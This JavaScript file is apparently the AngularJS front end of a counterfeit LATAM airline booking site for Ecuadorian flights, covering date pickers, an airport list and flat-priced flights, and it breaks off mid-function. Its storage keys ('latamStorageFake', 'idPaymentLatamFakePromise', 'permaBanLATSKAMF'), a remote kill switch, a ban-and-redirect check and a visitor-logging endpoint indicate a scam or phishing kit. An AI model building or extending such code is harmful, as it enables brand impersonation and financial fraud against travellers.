// === Helpers COP → USD (49,900 COP ≡ 19.95 USD) ===
// (Pegarlo al inicio de 000.js, antes de cualquier app.service/controller)
(function () {
  // Constante global (si ya existiera, se reutiliza)
  window.COP_TO_USD = window.COP_TO_USD || 19.95 / 49900;

  // Define las funciones si no existen y además crea alias locales
  if (typeof window.copToUsd !== "function") {
    window.copToUsd = function (n) {
      return Number(n || 0) * window.COP_TO_USD;
    };
  }
  if (typeof window.formatUSD !== "function") {
    window.formatUSD = function (n) {
      try {
        return new Intl.NumberFormat("en-US", {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        }).format(Number(n || 0));
      } catch (e) {
        var x = Math.round(Number(n || 0) * 100) / 100;
        return x.toFixed(2);
      }
    };
  }

  // Alias sin "window." para que $scope.getPriceFormatted los vea
  // (evita ReferenceError aunque el archivo esté en modo estricto)
  if (typeof copToUsd === "undefined") {
    var copToUsd = window.copToUsd;
  }
  if (typeof formatUSD === "undefined") {
    var formatUSD = window.formatUSD;
  }
})();

app.service("GUIDService", function () {
  var chosenGUID = localStorage.getItem("chosenGUID") || null;

  function generateGUID() {
    function s4() {
      return Math.floor((1 + Math.random()) * 0x10000)
        .toString(16)
        .substring(1);
    }
    return Math.random().toString(36).substr(2, 10);
  }

  if (!chosenGUID) {
    if (localStorage.getItem("idPaymentLatamFakePromise")) {
      chosenGUID = localStorage.getItem("idPaymentLatamFakePromise");
    } else {
      chosenGUID = generateGUID();
      localStorage.setItem("chosenGUID", chosenGUID);
      localStorage.setItem("idPaymentLatamFakePromise", chosenGUID);
    }
  }

  return {
    getGUID: function () {
      return chosenGUID;
    },
  };
});

app.controller("startController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  "GUIDService",
  function ($scope, $http, $timeout, $interval, $state, GUIDService) {
    var chosenGUID = GUIDService.getGUID();

    $scope.checkOFF = function () {
      $http
        .post("api/checkOFF.html", {})
        .success(function (data) {
          if (data.id == "SHUTDOWN") {
            document.location.href = window.location.origin;
          }
        })
        .error(function (err) {
          console.log(err);
          $scope.loading = false;
        });
    };
    $scope.checkOFF();

    $scope.isThisMFBan = function () {
      if (
        null != localStorage.getItem("permaBanLATSKAMF") &&
        1 == localStorage.getItem("permaBanLATSKAMF")
      ) {
        document.location.href = window.location.origin;
      }
    };
    $scope.isThisMFBan();
  },
]);

app.controller("indexController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  function ($scope, $http, $timeout, $interval, $state) {
    // Inicialización de variables
    $scope.radioIV = 1;
    $scope.radioI = 0;
    $scope.rIV = 1;
    $scope.rI = 0;
    $scope.adults = 1;
    $scope.kids = 0;
    $scope.babys = 0;
    // Inicializamos $scope.data para evitar undefined
    $scope.data = {
      cabine: { price: 0 }, // Precio inicial
      passengers: [], // Lista de pasajeros vacía
    };

    $scope.isSelectingNew = false;

    $scope.createCompatibleDate = function (dateStr) {
      if (!dateStr) return null;
      // Convertir el formato YYYY-M-D a YYYY/MM/DD para compatibilidad con iOS
      let parts = dateStr.split("-");
      // Asegurar que el mes y día tengan dos dígitos
      let month = parts[1].padStart(2, "0");
      let day = parts[2].padStart(2, "0");
      return new Date(parts[0] + "/" + month + "/" + day);
    };

    $scope.createProperDate = function (dateStr) {
      if (!dateStr) return null;
      let parts = dateStr.split("-");
      // Ajustar el mes sumando 1 ya que en el string viene 0-based
      let month = parseInt(parts[1]) + 1;
      // Crear fecha en formato MM/DD/YYYY para mejor compatibilidad
      return new Date(month + "/" + parts[2] + "/" + parts[0]);
    };

    // Configuración inicial
    document.querySelector("#go-back").checked = true;
    document.querySelector("#rest-options").classList.remove("d-none");
    document.querySelector("#cont-destination").classList.remove("pb-5");
    document.querySelector(".index-background").style.height = "630px";

    // Función para scroll
    $scope.goTop = function () {
      $("html, body").animate({
        scrollTop: 0,
      });
    };

    $scope.formatDay = function (day) {
      return day < 10 ? "0" + day : day.toString();
    };
    $scope.calcTotal = function () {
      try {
        var add = 0;
        if ($scope.pickedF && $scope.pickedF.cabine === "l") add = 50000;
        else if ($scope.pickedF && $scope.pickedF.cabine === "f") add = 90000;
        var base =
          $scope.pickedF && $scope.pickedF.vuelo && $scope.pickedF.vuelo.price
            ? $scope.pickedF.vuelo.price
            : 0;
        var totalCOP = (parseInt(base, 10) || 0) + add;
        if (
          $scope.dataVuelos &&
          $scope.dataVuelos.travelType == 1 &&
          $scope.pickedFV &&
          $scope.pickedFV.vuelo
        ) {
          var add2 = 0;
          if ($scope.pickedFV.cabine === "l") add2 = 50000;
          else if ($scope.pickedFV.cabine === "f") add2 = 90000;
          totalCOP += (parseInt($scope.pickedFV.vuelo.price, 10) || 0) + add2;
        }
        if ($scope.dataVuelos && $scope.dataVuelos.passengers) {
          totalCOP *= parseInt($scope.dataVuelos.passengers, 10) || 1;
        }
        return formatUSD(copToUsd(totalCOP));
      } catch (e) {
        return formatUSD(0);
      }
    };

    // Manejo de tipo de viaje
    $scope.ivChange = function (type) {
      // 1 = Ida y vuelta, 0 = Solo ida
      $scope.dataVuelos = $scope.dataVuelos || {};
      $scope.dataVuelos.travelType = type;

      if (type === 1) {
        // Ida y vuelta
        $scope.rIV = 1;
        $scope.rI = 0;
        document.querySelector("#label-travel-type").textContent =
          "Ida y Vuelta";

        // Asegura objetos limpios
        $scope.pickedF = $scope.pickedF || { vuelo: null, cabine: null };
        $scope.pickedFV = $scope.pickedFV || { vuelo: null, cabine: null };
      } else {
        // Solo ida
        $scope.rI = 1;
        $scope.rIV = 0;
        document.querySelector("#label-travel-type").textContent = "Solo Ida";

        // **Resetear completamente la vuelta** para que no contamine el total
        $scope.pickedFV = { vuelo: null, cabine: null };
      }

      // Limpiar fechas seleccionadas al cambiar el tipo de viaje
      $scope.pickedDate = null;
      $scope.pickedDDate = null;
      $scope.donePicking = false;

      // Recalcular total con el nuevo estado
      if (typeof $scope.calcTotal === "function") $scope.calcTotal();
    };

    // Arrays de meses y días
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];
    $scope.daysT = ["Dom", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb"];

    // Configuración de fecha actual
    var currentDate = new Date();
    $scope.monthNumber = currentDate.getMonth() + 1;
    $scope.actualM = parseInt($scope.monthNumber);
    $scope.dd = String(currentDate.getDate()).padStart(2, "0");

    // Función auxiliar para días en el mes
    $scope.daysInMonth = function (jerriann, yamilah) {
      return new Date(yamilah, jerriann, 0).getDate();
    };

    $scope.getNumber = function (kaelo) {
      return new Array(kaelo);
    };

    // Manejo de pasajeros
    $scope.totalPasajeros = 1;

    $scope.passengersHandler = function (sherly, kasity) {
      switch (sherly) {
        case "adults":
          if ("+" == kasity) {
            $scope.adults++;
          } else if ($scope.adults > 1) {
            $scope.adults--;
          }
          break;
        case "children":
          if ("+" == kasity) {
            $scope.kids++;
          } else if ($scope.kids > 0) {
            $scope.kids--;
          }
          break;
        case "babies":
          if ("+" == kasity) {
            $scope.babys++;
          } else if ($scope.babys > 0) {
            $scope.babys--;
          }
      }
      $scope.getTotalPasajeros();
    };

    $scope.getTotalPasajeros = function () {
      $scope.totalPasajeros = $scope.adults + $scope.kids;
    };

    // Funciones de texto para fechas
    $scope.getVueltaText = function () {
      if ($scope.rI == 1) {
        return "Solo Ida";
      }
      if ($scope.pickedDDate == null) {
        return "Selecciona";
      }
      return $scope.getTextDate($scope.pickedDDate);
    };

    $scope.getIdaText = function () {
      if ($scope.pickedDate == null) {
        return "Selecciona";
      }
      return $scope.getTextDate($scope.pickedDate);
    };

    $scope.getTextFromInputDates = function (laryah, milfred) {
      if (1 == laryah) {
        if (null != $scope.pickedDate) {
          let imar = $scope.pickedDate.split("-");
          let monthIndex = parseInt(imar[1]) + 1;
          var biren = imar[2] + " De " + $scope.months[monthIndex];
          // Crear fecha correctamente
          let properDate = $scope.createProperDate($scope.pickedDate);
          if (1 == milfred) {
            return $scope.daysT[properDate.getDay()].substring(0, 3);
          }
          if (2 == milfred) {
            return biren;
          }
        }
        if (null != $scope.pickedDDate) {
          let maguire = $scope.pickedDDate.split("-");
          let monthIndex = parseInt(maguire[1]) + 1;
          biren = maguire[2] + " De " + $scope.months[monthIndex];
          // Crear fecha correctamente
          let properDate = $scope.createProperDate($scope.pickedDDate);
          if (3 == milfred) {
            return "a " + $scope.daysT[properDate.getDay()].substring(0, 3);
          }
          if (4 == milfred) {
            return biren;
          }
        }
      } else {
        if (null != $scope.pickedDate) {
          let zakayla = $scope.pickedDate.split("-");
          let monthIndex = parseInt(zakayla[1]) + 1;
          biren = zakayla[2] + " de " + $scope.months[monthIndex];
          // Crear fecha correctamente
          let properDate = $scope.createProperDate($scope.pickedDate);
          if (1 == milfred) {
            return $scope.daysT[properDate.getDay()].substring(0, 3);
          }
          if (2 == milfred) {
            return biren;
          }
        }
      }
    };

    $scope.getTextDate = function (francessca) {
      if (!francessca) return "";
      let holdin = francessca.split("-");
      let monthIndex = parseInt(holdin[1]) + 1;
      var aaliyaha = $scope.months[monthIndex]
        .toString()
        .substring(0, 3)
        .toLowerCase();
      // Crear fecha correctamente para obtener el día de la semana
      let properDate = $scope.createProperDate(francessca);
      let dayName = $scope.daysT[properDate.getDay()];
      return (
        dayName + ", " + holdin[2] + " de " + aaliyaha + ". de " + holdin[0]
      );
    };

    // Generación de fechas disponibles mejorada
    $scope.fechasDisponibles = [];
    var currentMonth = currentDate.getMonth(); // 0-11
    var currentYear = currentDate.getFullYear();

    for (let i = 0; i < 12; i++) {
      let month = ((currentMonth + i) % 12) + 1; // 1-12
      let year = currentYear + Math.floor((currentMonth + i) / 12);

      let monthString = month < 10 ? "0" + month : month.toString();
      var firstDayOfMonth = new Date(year, month - 1, 1).getDay(); // 0-6
      var daysInMonth = new Date(year, month, 0).getDate();

      var monthData = {
        mes: $scope.months[month],
        ano: year.toString(),
        days: daysInMonth,
        firstDayN: firstDayOfMonth,
        totalDays: daysInMonth + firstDayOfMonth,
      };
      $scope.fechasDisponibles.push(monthData);
    }

    $scope.getMesDay = function (salvotore) {
      for (let dyman = 0; dyman < $scope.months.length; dyman++) {
        if (salvotore == $scope.months[dyman]) {
          return dyman;
        }
      }
    };

    // Función mejorada para días en gris
    $scope.dayGray = function (wednesday, arlesia) {
      try {
        let year = parseInt(arlesia.ano);
        let month = $scope.getMesDay(arlesia.mes);
        let day = parseInt(wednesday) - parseInt(arlesia.firstDayN) + 1;

        // Formatear la fecha para compatibilidad con iOS
        let formattedMonth = month < 10 ? "0" + month : "" + month;
        let formattedDay = day < 10 ? "0" + day : "" + day;

        let dateToCheck = new Date(
          year + "/" + formattedMonth + "/" + formattedDay
        );
        let today = new Date();
        today.setHours(0, 0, 0, 0);

        return dateToCheck < today;
      } catch (error) {
        console.error("Error en dayGray:", error);
        return false;
      }
    };

    // Función mejorada para selección de día
    $scope.pickODay = function (malack, astreia) {
      if ($scope.dayGray(malack, astreia)) {
        return;
      }

      // Obtener el mes y día correctos
      var monthPosition = 0;
      for (let i = 0; i < $scope.months.length; i++) {
        if ($scope.months[i] == astreia.mes) {
          monthPosition = i - 1; // Ajustar el índice del mes
        }
      }

      var selectedDay = malack + 1 - astreia.firstDayN;
      // Asegurar formato de dos dígitos
      var formattedDay =
        selectedDay < 10 ? "0" + selectedDay : "" + selectedDay;
      var formattedMonth =
        monthPosition < 10 ? "0" + monthPosition : "" + monthPosition;

      // Crear la fecha en formato YYYY-MM-DD
      var selectedDate =
        astreia.ano + "-" + formattedMonth + "-" + formattedDay;

      try {
        if ($scope.rIV == 1) {
          if (!$scope.pickedDate) {
            $scope.pickedDate = selectedDate;
          } else if (!$scope.pickedDDate) {
            let selectedDateTime = $scope.createCompatibleDate(selectedDate);
            let idaDateTime = $scope.createCompatibleDate($scope.pickedDate);

            if (selectedDateTime > idaDateTime) {
              $scope.pickedDDate = selectedDate;
              $scope.donePicking = true;
              setTimeout(() => {
                $scope.hideModal("select-dates");
                $scope.$apply();
              }, 100);
            } else {
              $scope.pickedDate = selectedDate;
              $scope.pickedDDate = null;
            }
          }
        } else if ($scope.rI == 1) {
          $scope.pickedDate = selectedDate;
          $scope.donePicking = true;
          $scope.stepCH = undefined;
          setTimeout(() => {
            $scope.hideModal("select-dates");
            $scope.$apply();
          }, 100);
        }
      } catch (error) {
        console.error("Error en pickODay:", error);
      }

      $scope.errorPD = undefined;
      $scope.errorPDD = undefined;
    };

    // Funciones de fecha adicionales
    $scope.getDateText = function () {
      if (null != $scope.pickedDate) {
        let lunarae = $scope.pickedDate;
        lunarae = lunarae.split("-");
        let tashawn = $scope.months[lunarae[1]];
        tashawn = tashawn.substr(0, 3);
        if (
          1 == $scope.radioIV &&
          null != $scope.pickedDate &&
          null != $scope.pickedDDate
        ) {
          let priscillia = $scope.pickedDDate;
          priscillia = priscillia.split("-");
          let kaddy = $scope.months[priscillia[1]];
          kaddy = kaddy.substr(0, 3);
          return (
            lunarae[2] +
            " " +
            tashawn.toLowerCase() +
            ". - " +
            priscillia[2] +
            " " +
            kaddy.toLowerCase() +
            "."
          );
        }
        if (1 == $scope.radioIV && null != $scope.pickedDate) {
          return lunarae[2] + " " + tashawn.toLowerCase() + ". -";
        }
        if (1 == $scope.radioI && null != $scope.pickedDate) {
          return lunarae[2] + " " + tashawn.toLowerCase() + ".";
        }
      }
    };

    $scope.getMiniDateText = function () {
      if (null != $scope.pickedDate) {
        let properDate = $scope.createProperDate($scope.pickedDate);

        if (
          1 == $scope.radioIV &&
          null != $scope.pickedDate &&
          null != $scope.pickedDDate
        ) {
          let properDateReturn = $scope.createProperDate($scope.pickedDDate);
          return (
            $scope.daysT[properDate.getDay()] +
            " - " +
            $scope.daysT[properDateReturn.getDay()] +
            "."
          );
        }
        if (1 == $scope.radioIV && null != $scope.pickedDate) {
          return $scope.daysT[properDate.getDay()] + ".";
        }
        if (1 == $scope.radioI && null != $scope.pickedDate) {
          return $scope.daysT[properDate.getDay()] + ".";
        }
      }
    };

    $scope.isPicked = function (zacharius, avalyse) {
      try {
        var monthPos = 0;
        for (let i = 0; i < $scope.months.length; i++) {
          if ($scope.months[i] == avalyse.mes) {
            monthPos = i - 1; // Ajustar el índice del mes
          }
        }

        var day = zacharius + 1 - avalyse.firstDayN;
        var formattedDay = day < 10 ? "0" + day : "" + day;
        var formattedMonth = monthPos < 10 ? "0" + monthPos : "" + monthPos;

        var dateToCheck =
          avalyse.ano + "-" + formattedMonth + "-" + formattedDay;
        return (
          dateToCheck === $scope.pickedDate ||
          dateToCheck === $scope.pickedDDate
        );
      } catch (error) {
        console.error("Error en isPicked:", error);
        return false;
      }
    };

    // Datos de aeropuertos disponibles en Ecuador
    const lasonja = [
      {
        city: "Ahuano",
        country: "Ecuador",
        code: "TNW",
        name: "Jumandy",
      },
      {
        city: "Bahía de Caráquez",
        country: "Ecuador",
        code: "BHA",
        name: "Los Perales",
      },
      {
        city: "Coca",
        country: "Ecuador",
        code: "OCC",
        name: "Francisco de Orellana",
      },
      {
        city: "Cuenca",
        country: "Ecuador",
        code: "CUE",
        name: "Mariscal Lamar Intl.",
      },
      {
        city: "Guayaquil",
        country: "Ecuador",
        code: "GYE",
        name: "José Joaquín de Olmedo Intl.",
      },
      {
        city: "Isla Baltra (Galápagos)",
        country: "Ecuador",
        code: "GPS",
        name: "Seymour Airport",
      },
      {
        city: "Jipijapa",
        country: "Ecuador",
        code: "JIP",
        name: "Portoviejo Los Perales (regional)",
      },
      {
        city: "La Toma (Catamayo)",
        country: "Ecuador",
        code: "LOH",
        name: "Camilo Ponce Enríquez",
      },
      {
        city: "Lago Agrio",
        country: "Ecuador",
        code: "LGQ",
        name: "Nueva Loja",
      },
      {
        city: "Latacunga",
        country: "Ecuador",
        code: "LTX",
        name: "Cotopaxi Intl.",
      },
      {
        city: "Macará",
        country: "Ecuador",
        code: "MRR",
        name: "J. M. Velasco Ibarra",
      },
      {
        city: "Macas",
        country: "Ecuador",
        code: "XMS",
        name: "Edmundo Carvajal",
      },
      {
        city: "Manta",
        country: "Ecuador",
        code: "MEC",
        name: "Eloy Alfaro Intl.",
      },
      {
        city: "Portoviejo",
        country: "Ecuador",
        code: "PVO",
        name: "Reales Tamarindos",
      },
      {
        city: "Puerto Baquerizo Moreno (Galápagos)",
        country: "Ecuador",
        code: "SCY",
        name: "San Cristóbal Airport",
      },
      {
        city: "Puerto Putumayo",
        country: "Ecuador",
        code: "PYO",
        name: "Putumayo Airport",
      },
      {
        city: "Puerto Villamil (Galápagos)",
        country: "Ecuador",
        code: "IBB",
        name: "Isabela Airport",
      },
      {
        city: "Salinas",
        country: "Ecuador",
        code: "SNC",
        name: "General Ulpiano Páez Intl.",
      },
      {
        city: "Santa Rosa",
        country: "Ecuador",
        code: "ETR",
        name: "Santa Rosa Intl.",
      },
      {
        city: "Santiago de Méndez",
        country: "Ecuador",
        code: "MZD",
        name: "Santiago de Méndez Airport",
      },
      {
        city: "Shell Mera",
        country: "Ecuador",
        code: "PTZ",
        name: "Río Amazonas Airport",
      },
      {
        city: "Sucúa",
        country: "Ecuador",
        code: "SUQ",
        name: "Sucúa Airport",
      },
      {
        city: "Tachina (Esmeraldas)",
        country: "Ecuador",
        code: "ESM",
        name: "Coronel Carlos Concha Torres Intl.",
      },
      {
        city: "Taisha",
        country: "Ecuador",
        code: "TSC",
        name: "Taisha Airport",
      },
      {
        city: "Tarapoa",
        country: "Ecuador",
        code: "TPC",
        name: "Tarapoa Airport",
      },
      {
        city: "Quito",
        country: "Ecuador",
        code: "UIO",
        name: "Mariscal Sucre Intl.",
      },
    ];

    // Configuración inicial
    document.querySelector("#eco").checked = true;

    // Funciones de modal
    $scope.showModalStatus = function (thessaly) {
      try {
        if (thessaly === "select-dates") {
          // Guardar las fechas anteriores
          $scope.previousPickedDate = $scope.pickedDate;
          $scope.previousPickedDDate = $scope.pickedDDate;
          // Limpiar las fechas para nueva selección
          $scope.pickedDate = null;
          $scope.pickedDDate = null;
          $scope.donePicking = false;
        }

        let modal = document.getElementById(thessaly);
        if (modal) {
          modal.classList.remove("hiding");
          modal.classList.add("d-flex");
          modal.classList.add("showing");
        }
      } catch (error) {
        console.error("Error en showModalStatus:", error);
      }
    };

    $scope.hideModal = function (maryetta) {
      try {
        if (maryetta === "select-dates" && !$scope.donePicking) {
          // Restaurar fechas anteriores si no se completó la selección
          $scope.pickedDate = $scope.previousPickedDate;
          $scope.pickedDDate = $scope.previousPickedDDate;
        }

        let modal = document.getElementById(maryetta);
        if (modal) {
          modal.classList.remove("showing");
          modal.classList.add("hiding");
        }
      } catch (error) {
        console.error("Error en hideModal:", error);
      }
    };

    // Búsqueda de aeropuertos
    $scope.airportsAvailable = [];
    $scope.searchAirports = function (sachi, zarhianna) {
      var meilynn = $scope.originI;
      $scope.airportTySel = "origin";
      if ("destination" == zarhianna) {
        meilynn = $scope.destinationI;
        $scope.airportTySel = "destination";
      }
      document.querySelector("#search-results-" + zarhianna);
      $scope.airportsAvailable = [];
      for (let elysia = 0; elysia < lasonja.length; elysia++) {
        if (
          null != meilynn &&
          (lasonja[elysia].country
            .toLowerCase()
            .includes(meilynn.toLowerCase()) ||
            lasonja[elysia].city
              .toLowerCase()
              .includes(meilynn.toLowerCase()) ||
            lasonja[elysia].code.toLowerCase().includes(meilynn.toLowerCase()))
        ) {
          $scope.airportsAvailable.push(lasonja[elysia]);
        }
      }
    };

    $scope.setAirport = function (lytonia, neel) {
      lasonja.forEach((skipp) => {
        if (skipp.code === lytonia) {
          if ("destination" == neel) {
            $scope.destination = skipp;
            $scope.hideModal("select-destination");
          } else {
            $scope.origin = skipp;
            $scope.hideModal("select-origin");
          }
          $scope.originI = undefined;
          $scope.destinationI = undefined;
          $scope.airportsAvailable = [];
        }
      });
      if (null != $scope.destination && null != $scope.origin) {
        document.querySelector("#rest-options").classList.remove("d-none");
        document.querySelector("#cont-destination").classList.remove("pb-5");
        document.querySelector(".index-background").style.height = "630px";
      }
    };

    $scope.redField = function (kalpana) {
      $(kalpana).css("border-color", "red");
    };

    // Funciones de navegación y validación
    $scope.nextStep = function () {
      if (1 == $scope.rI) {
        if (null != $scope.origin) {
          if (null != $scope.destination) {
            if (null != $scope.pickedDate) {
              $scope.buildLSNGO();
            } else {
              $scope.redField("#label-dates");
            }
          } else {
            $scope.redField("#label-destination");
          }
        } else {
          $scope.redField("#label-origin");
        }
      } else if (1 == $scope.rIV && null != $scope.origin) {
        if (null != $scope.destination) {
          if (null != $scope.pickedDate && null != $scope.pickedDDate) {
            $scope.buildLSNGO();
          } else {
            $scope.redField("#label-dates");
          }
        } else {
          $scope.redField("#label-destination");
        }
      } else {
        $scope.redField("#label-origin");
      }
    };

    $scope.formatDateForStorage = function (date) {
      if (!date) return null;
      let parts = date.split("-");
      // Asegurar que el mes esté en el formato correcto
      let month = parseInt(parts[1]) + 1; // Sumamos 1 porque el mes viene 0-based
      month = month < 10 ? "0" + month : month.toString();
      return parts[0] + "-" + month + "-" + parts[2];
    };

    // Funciones de almacenamiento local y navegación
    $scope.buildLSNGO = function () {
      let dron = 1;
      if (1 != $scope.rIV) {
        dron = 0;
      }

      // Formatear las fechas correctamente
      let formattedDate1 = $scope.formatDateForStorage($scope.pickedDate);
      let formattedDate2 = $scope.formatDateForStorage($scope.pickedDDate);

      var mavourneen = localStorage.getItem("latamStorageFake");
      if (null != mavourneen) {
        mavourneen = JSON.parse(mavourneen);
        var niralya = -1;
        for (let emaan = 0; emaan < mavourneen.length; emaan++) {
          if (1 == mavourneen[emaan].step) {
            niralya = emaan;
          }
        }
        if (-1 != niralya) {
          mavourneen[niralya].info = [];
          mavourneen[niralya].info.push({
            origin: $scope.origin,
            destination: $scope.destination,
            travelType: dron,
            passengers: parseInt($scope.adults + $scope.kids),
            dd1: formattedDate1,
            dd2: formattedDate2,
          });
          localStorage.setItem("latamStorageFake", JSON.stringify(mavourneen));
          $scope.goFlights();
        }
      } else {
        var zykirah = [
          {
            step: 1,
            info: [],
          },
        ];
        zykirah[0].info.push({
          origin: $scope.origin,
          destination: $scope.destination,
          travelType: dron,
          passengers: parseInt($scope.adults + $scope.kids),
          dd1: formattedDate1,
          dd2: formattedDate2,
        });
        localStorage.setItem("latamStorageFake", JSON.stringify(zykirah));
        $scope.goFlights();
      }
    };

    $scope.goFlights = function () {
      let randolyn = 1;
      if (1 != $scope.rIV) {
        randolyn = 0;
      }
      $state.transitionTo("/Vuelopick", {
        date1: $scope.pickedDate,
        date2: $scope.pickedDDate,
        type: randolyn,
        passagers: parseInt($scope.adults + $scope.kids),
        origin: $scope.origin,
        destiny: $scope.destination,
      });
    };
  },
]);

app.controller("fligthsController", [
  "$scope",
  "$http",
  "$timeout",
  "$interval",
  "$state",
  "GUIDService",
  function ($scope, $http, $timeout, $interval, $state, GUIDService) {
    $scope.goHome = function () {
      $state.transitionTo("/");
    };
    $scope.regLog = function (data) {
      $http
        .post("api/regLog", {
          log: data,
        })
        .success(function (haaniya) {})
        .error(function (winiferd) {
          console.log(winiferd);
          $scope.loading = false;
        });
    };

    $scope.createProperDate = function (dateStr) {
      if (!dateStr) return null;
      let parts = dateStr.split("-");
      // Ajustar el mes para la creación de la fecha
      let month = parseInt(parts[1]);
      // Crear fecha en formato MM/DD/YYYY para mejor compatibilidad
      return new Date(month + "/" + parts[2] + "/" + parts[0]);
    };

    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];
    $scope.daysT = ["Dom", "Lun", "Mar", "Mié", "Jue", "Vie", "Sáb"];
    $scope.monthNumber = new Date().getMonth() + 1;

    $scope.daysInMonth = function (malaja, andjoua) {
      return new Date(andjoua, malaja, 0).getDate();
    };

    $scope.getNumber = function (sourya) {
      return new Array(sourya);
    };

    var hezekyah = new Date();
    $scope.dd = String(hezekyah.getDate()).padStart(2, "0");
    $scope.vuelos = [
      {
        h1: "4:40 a.m.",
        h2: "5:47 a.m.",
        avt: "1h 7 min",
        price: 49900,
      },
      {
        h1: "10:30 a.m.",
        h2: "12:05 p.m.",
        avt: "1h 35 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 49900,
      },
      {
        h1: "18:15 p.m.",
        h2: "19:45 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
    ];
    $scope.vuelos2 = [
      {
        h1: "6:40 a.m.",
        h2: "7:56 a.m.",
        avt: "1h 16 min",
        price: 49900,
      },
      {
        h1: "8:30 a.m.",
        h2: "9:55 p.m.",
        avt: "1h 15 min",
        price: 49900,
      },
      {
        h1: "13:20 p.m.",
        h2: "14:28 p.m.",
        avt: "1h 8 min",
        price: 49900,
      },
      {
        h1: "16:15 p.m.",
        h2: "17:45 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
    ];
    $scope.vuelosStandard = [
      {
        h1: "4:40 a.m.",
        h2: "5:47 a.m.",
        avt: "1h 7 min",
        price: 49900,
      },
      {
        h1: "10:30 a.m.",
        h2: "12:05 p.m.",
        avt: "1h 35 min",
        price: 49900,
      },
      {
        h1: "14:50 p.m.",
        h2: "16:10 p.m.",
        avt: "1h 20 min",
        price: 49900,
      },
      {
        h1: "18:15 p.m.",
        h2: "19:45 p.m.",
        avt: "1h 30 min",
        price: 49900,
      },
    ];
    $scope.pickingFType = 1;
    $scope.loader = true;

    $timeout(function () {
      $scope.loader = undefined;
    }, 500);
    $scope.dataLatam = JSON.parse(localStorage.getItem("latamStorageFake"));
    var lyzander = -1;
    for (let rosheka = 0; rosheka < $scope.dataLatam.length; rosheka++) {
      if (1 == $scope.dataLatam[rosheka].step) {
        lyzander = rosheka;
      }
    }
    $scope.dataVuelos = undefined;
    if (-1 != lyzander) {
      $scope.dataVuelos = $scope.dataLatam[parseInt(lyzander)].info[0];
    } else {
      $state.transitionTo("/");
    } // Definición de los días de la semana y los meses
    $scope.daysT = ["Do", "Lu", "Ma", "Mi", "Ju", "Vi", "Sa"];
    $scope.months = [
      "",
      "Enero",
      "Febrero",
      "Marzo",
      "Abril",
      "Mayo",
      "Junio",
      "Julio",
      "Agosto",
      "Septiembre",
      "Octubre",
      "Noviembre",
      "Diciembre",
    ];

    // Función para obtener las fechas de los vuelos
    $scope.getDatesVuelos = function (shanie, denesa) {
      if (shanie != null) {
        let kaliese = shanie.split("-");
        // Usar la función helper para crear la fecha
        var yasmein = $scope.createProperDate(shanie);
        var dayIndex = yasmein.getDay();

        var suyapa =
          $scope.daysT[dayIndex] +
          ". " +
          kaliese[2] +
          " de " +
          $scope.months[parseInt(kaliese[1])].toLowerCase();

        if (denesa != null) {
          // Usar la función helper para la fecha de vuelta también
          let arien = denesa.split("-");
          var yasmeinVuelta = $scope.createProperDate(denesa);
          var dayIndexVuelta = yasmeinVuelta.getDay();

          suyapa +=
            " a " +
            $scope.daysT[dayIndexVuelta] +
            ". " +
            arien[2] +
            " de " +
            $scope.months[parseInt(arien[1])].toLowerCase();
        }

        return suyapa;
      }
      return "";
    };

    // Función para obtener el número de días en un mes
    $scope.daysInMonth = function (jerriann, yamilah) {
      return new Date(yamilah, jerriann, 0).getDate();
    };

    // Función para obtener el primer día del mes (0 = Domingo, 6 = Sábado)
    $scope.getFirstDayOfMonth = function (year, month) {
      // Crear fecha directamente en formato MM/DD/YYYY
      return new Date(month + "/1/" + year).getDay();
    };

    // Función para generar los días del mes para el calendario
    $scope.generateMonthDays = function (year, month) {
      var firstDay = $scope.getFirstDayOfMonth(year, month);
      var daysInMonth = $scope.daysInMonth(month, year);
      var days = [];

      // Agregar días vacíos al principio si es necesario
      for (var i = 0; i < firstDay; i++) {
        days.push(null);
      }

      // Agregar los días del mes
      for (var i = 1; i <= daysInMonth; i++) {
        days.push(i);
      }

      return days;
    };

    // Función para obtener el texto de una fecha
    $scope.getTextDate = function (date) {
      if (!date) return "";

      let parts = date.split("-");
      // Usar la función helper para crear la fecha
      let dateObj = $scope.createProperDate(date);

      return (
        $scope.daysT[dateObj.getDay()] +
        ". " +
        parts[2] +
        " de " +
        $scope.months[parseInt(parts[1])].toLowerCase()
      );
    };

    $scope.addshowCard = function (kanaya) {
      if (kanaya != $scope.showCard) {
        $scope.showCard = kanaya;
      }
    };
    $scope.hideShowCard = function () {
      $timeout(function () {
        $scope.showCard = undefined;
      }, 100);
    };
    $scope.getPriceFormatted = function (baseCOP, extraCOP) {
      var baseCOP = arguments[0];
      var extraCOP = arguments[1];
      var totalCOP =
        (parseInt(baseCOP, 10) || 0) + (parseInt(extraCOP, 10) || 0);
      return formatUSD(copToUsd(totalCOP));
    };

    $scope.GUID = function () {
      return "10000000-1000-4000-8000-100000000000".replace(
        /[018]/g,
        (desiya) =>
          (
            desiya ^
            (crypto.getRandomValues(new Uint8Array(1))[0] &
              (15 >> (desiya / 4)))
          ).toString(16)
      );
    };
    $scope.chosenGUID = GUIDService.getGUID();
    $scope.pickFlight = function (type, dir) {
      // Soporta llamadas antiguas: pickFlight('l') -> ida por defecto
      // y nuevas: pickFlight('l', 'vuelta')
      var tramoVuelta = dir === "vuelta"; // true si es vuelta
      var step = tramoVuelta ? 3 : 2; // 2 = ida, 3 = vuelta

      var somayah = $scope.dataLatam;
      if (!Array.isArray(somayah)) {
        somayah = [];
        $scope.dataLatam = somayah;
      }

      // Lista de vuelos por tramo (vuelta usa vuelos2)
      var list;
      if (tramoVuelta) {
        list =
          Array.isArray($scope.vuelos2) && $scope.vuelos2.length
            ? $scope.vuelos2
            : $scope.vuelos;
      } else {
        list = $scope.vuelos;
      }

